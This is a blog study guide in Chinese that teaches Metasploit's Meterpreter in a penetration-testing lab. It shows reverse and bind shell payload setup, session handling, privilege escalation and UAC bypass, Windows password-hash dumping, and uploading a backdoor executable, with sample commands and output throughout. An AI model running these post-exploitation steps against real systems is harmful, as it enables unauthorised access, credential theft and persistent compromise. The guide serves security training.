---
layout: post
title: "Meterpreter - Study Guide"
date: "2022-07-26"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student
    - Network Attacks
---

# Meterpreter - Study Guide
这如何支持我的渗透测试生涯？
有能力：
* 在被利用的机器上获取强大的 shell
* 控制被利用的机器
* 安装后门

**Meterpreter** 是一个非常强大的 shell，可以在 Android、BSD、Java、Linux、PHP、Python 和 Windows 易受攻击的应用程序和服务上运行。
它提供了许多有用的功能，可以帮助渗透测试人员进一步渗透目标系统和网络。

Meterpreter 不仅仅是一个简单的shell。 它提供了高级功能来收集信息、在攻击者和受害者机器之间传输文件、安装后门等等。
在下面的幻灯片中，您将看到它的基本用法。

要列出所有可能的 Meterpreter 有效负载，您可以在 MSFConsole 中运行搜索：

```
msf6 > search meterpreter
```

选择有效负载是使用 `set` 命令的问题。 例如，在攻击 Windows 机器时，您将使用：

```
msf exploit(explmod) > set payload windows/meterpreter/reverse_tcp
```

## Bind and Reverse（绑定和反向）
Meterpreter 既可以等待目标机器上的连接，也可以连接回攻击者机器。 它最常用的配置是`bind_tcp` 和`reverse_tcp`。
* `bind_tcp` 在目标机器上运行一个服务器进程，等待来自攻击者机器的连接
* `reverse_tcp` 执行与攻击者机器的 TCP 连接。 正如您在后门一章中看到的，此功能可以帮助规避防火墙规则

选择要使用的配置是为漏洞利用模块设置正确的有效负载的问题。

```
# Selecting Meterpreter reverse_tcp for Windows or Linux（为 Windows 或 Linux 选择 Meterpreter reverse_tcp）
msf6 exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp

# Selecting Meterpreter bind_tcp for Windows or Java（为 Windows 或 Java 选择 Meterpreter bind_tcp）
msf6 exploit(handler) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf6 exploit(handler) > set payload java/meterpreter/bind_tcp
payload => java/meterpreter/bind_tcp
```

## Launching Meterpreter（启动 Meterpreter）
为攻击设置正确的有效负载后，您必须运行漏洞利用程序以获取 Meterpreter **会话**：

```
msf exploit(handler) > exploit

[*] Started bind handler
[*] Starting the payload handler...
[*] Sending stage (77048 bytes) to 192.168.75.28
[*] Meterpreter session 1 opened (192.168.75.17:50082 -> 192.168.75.28:5555) at 2015-02-20 12:49:08 +0100

meterpreter >
```

Meterpreter 会话是目标机器上的高级 shell。
在下面的幻灯片中，您将看到如何管理会话和使用 Meterpreter 提供的主要功能。

## Sessions（会话）
单个 MSFConsole 实例可以托管多个 Meterpreter 会话； 这意味着您可以在目标上实例化多个 shell 并在它们之间切换。
您可以使用`background`命令从 Meterpreter 会话切换到控制台：

```
meterpreter > background
[*] Backgrounding session 1...
msf exploit (handler) >
```

然后，您可以使用 `session -l` 命令列出当前打开的会话。

```
msf exploit(handler) > session -l

Active sessions
===============
Id      Type                    Information         Connection
--      ----                    -----------         ----------
1       meterpreter x86/win32   els\els @ ELS       192.168.75.17:50082 ->
                                                    192.168.75.28:5555 (192.168.75.28)
```

192.168.75.17:50082：Address of the attacker machine（攻击者地址）
192.168.75.28:5555：Address of the victim machine（受害机器的地址）

要恢复后台会话，您必须使用 `sessions -i` 命令。

```
msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >
```

## Information Gathering with Meterpreter（使用 Meterpreter 收集信息）
Meterpreter 允许您在被利用的机器及其连接的网络上执行信息收集。 您可以检索：
* 有关机器和操作系统的信息
* 正在使用的网络配置
* 受感染主机的路由表
* 有关运行被利用进程的用户的信息

### System Information（系统信息）
`sysinfo` 命令可让您检索有关被利用机器的信息：名称、操作系统、架构、系统语言和它正在运行的 Meterpreter 版本。

```
meterpreter > sysinfo
Computer        : ELS
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64 (Current Process is WOW64)
System Language : en_US
Meterpreter     : x64/win32
meterpreter >
```

### Network Configuration（网络配置）
`ifconfig` 命令打印网络配置。

```
meterpreter > ifconfig
```

### Routing Information（路由信息）
您可以使用 `route` 命令检查路由信息。

```
meterpreter > route
```

### Current User（当前用户）
要知道哪个用户正在运行 Metasploit 利用的进程，可以使用 `getuid` 命令。

```
meterpreter > getuid
Server username: els\els
meterpreter >
```

### Privilege Escalation（权限提升）
如果进程的所有者在受害系统上没有高权限，则可以使用 `getsystem` 命令。 此命令在目标机器上运行特权升级例程。 在 Windows 环境中，`system`用户在机器上拥有**最高权限**。

```
meterpreter > getsystem
...got system (via technique 1).
```

#### Bypassing UAC（绕过 UAC）
请注意，在现代 Windows 操作系统中，**用户帐户控制**策略可防止权限提升。

```
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: The environment is incorrect.
```

您可以使用 `bypassuac` 模块绕过该限制。

```
meterpreter > background
[*] Backgrounding session 1...
msf exploit(handler) > search bypassuac

Matching Modules
================
Name                                        Disclosure Date             Rank                    Description
----                                        ---------------             ----                    -----------
exploit/windows/local/bypassuac             2010-12-31                  excellent               Windows Escalate UAC Protection Bypass
exploit/windows/local/bypassuac_injections  2010-12-31                  exeellent               Windows Escalate UAC Protection Bypass(In Memory Injection)

msf exploit(handler) > use exploit/windows/local/bypassuac
```

这个模块只接受一个参数，即您要绕过 UAC 的 Meterpreter 会话。

```
msf exploit(bypassuac) > show options

Module options (exploit/windows/local/bypassuac):

Name        Current Setting     Required    Description
----        ---------------     --------    -----------
SESSION                         yes         The session to run this module on.
TECHNIQUE   EXE                 yes         Technique to use if UAC is turned off (accepted: PSH, EXE)

msf exploit(bypassuac) > set session 1
```

启动漏洞利用后，您将获得一个新的 Meterpreter 会话。

![exploit-bypass-uac.png](/img/in-post/ine/exploit-bypass-uac.png)

新会话禁用了 UAC 策略，因此 `getsystem` 命令有效！

```
meterpreter > getuid
Server username: els\els
meterpreter > getsystem
...got system (via technique 1).
meterpreter >
```

在系统上拥有管理权限意味着能够读取受保护的文件或更改配置。

## Dumping the Password Database（转储密码数据库）
例如，您可以转储密码数据库并将其保存以供离线破解会话使用。 hashdump 模块转储 Windows 机器的密码数据库。

```
meterpreter > background
[*] Backgrounding session 2...
msf > use post/windows/gather/hashdump
msf post(hashdump) > show options

Module options (post/windows/gather/hashdump):
Name            Current Setting     Required    Description
-----           ---------------     --------    -------------
SESSION                             yes         The session to run this module on.

msf post(hashdump) > set session 2
```

配置完成后，您可以运行`exploit` 命令开始转储哈希。

```
msf post(hashdump) > exploit
```

![dumping-the-password-database.png](/img/in-post/ine/dumping-the-password-database.png)

## Exploring the Victim System（探索受害者系统）
Meterpreter 让您可以使用类 Unix 的 shell 命令导航受害者的硬盘：

```
meterpreter > pwd # Prints the working directory 打印工作目录
C:\Windows\System32
meterpreter > cd C:\\ # Changes directory. Please note that you have to escape backslashes by doubling them. 更改目录。 请注意，您必须通过将反斜杠加倍来逃避反斜杠。
meterpreter > pwd
C:\
meterpreter > ls # Lists the current directory 列出当前目录
```

![exploring-the-victim-system.png](/img/in-post/ine/exploring-the-victim-system.png)

## Uploading and Downloading（上传和下载）
此外，您可以使用同名命令上传和下载文件。

```
meterpreter > download HaxLogs.log /root/
meterpreter > upload /root/backdoor.exe C:\\Windows # Note the backslash escaping 注意反斜杠转义
```

![uploading-and-downloading.png](/img/in-post/ine/uploading-and-downloading.png)

## Running an OS Shell（运行操作系统Shell）
您还可以运行标准操作系统shell。

```
meterpreter > shell
Process 2420 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd \
C:\>exit
meterpreter >
```

## The Help
每个 Meterpreter 命令都有简短的帮助信息。 您可以通过在命令行上使用 `-h` 参数来检查它。

```
meterpreter > upload -h
Usage: upload [options] src1 src2 src3 ... destination

Uploads local files and directories to the remote machine.

OPTIONS:
    -h  Help banner.
    -r  Upload recursively.
```

此外，您可以使用 help 命令显示所有 Meterpreter 命令。

```
meterpreter > help
```

## References
[Disniff suite](https://www.monkey.org/~dugsong/dsniff/)